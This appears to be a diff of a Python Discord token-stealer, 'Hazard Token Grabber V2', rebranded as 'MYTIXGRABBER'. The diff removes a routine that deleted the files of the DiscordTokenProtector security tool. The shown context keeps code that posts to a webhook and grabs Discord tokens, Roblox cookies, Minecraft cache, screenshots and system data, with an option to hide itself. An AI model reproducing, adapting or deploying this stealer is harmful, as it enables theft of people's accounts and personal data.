@@ -141,7 +141,7 @@ class Functions(object):
         return config.get(e)
 
 
-class HazardTokenGrabberV2(Functions):
+class MYTIXGRABBER(Functions):
     def __init__(self):
         self.webhook = self.fetch_conf('webhook')
         self.discordApi = "https://discord.com/api/v9/users/@me"
@@ -200,8 +200,7 @@ class HazardTokenGrabberV2(Functions):
         
             
 
-        await self.bypassBetterDiscord()
-        await self.bypassTokenProtector()
+        
 
         function_list = [self.screenshot, self.sys_dump, self.grab_tokens, self.grabMinecraftCache, self.grabRobloxCookie]
         if self.fetch_conf('hide_self'):
@@ -273,18 +272,7 @@ class HazardTokenGrabberV2(Functions):
                 except (psutil.NoSuchProcess, psutil.AccessDenied):
                     pass
 
-    async def bypassTokenProtector(self):
-        # fucks up the discord token protector by https://github.com/andro2157/DiscordTokenProtector
-        tp = f"{self.roaming}\\DiscordTokenProtector\\"
-        if not ntpath.exists(tp):
-            return
-        config = tp + "config.json"
-
-        for i in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
-            try:
-                os.remove(tp + i)
-            except FileNotFoundError:
-                pass
+    
         
 
     @try_extract
@@ -726,4 +714,4 @@ if __name__ == "__main__" and os.name == "nt":
         httpx.get('https://google.com')
     except (httpx.NetworkError, httpx.TimeoutException):
         os._exit(0)
-    asyncio.run(HazardTokenGrabberV2().init())
+    asyncio.run(MYTIXGRABBER().init())
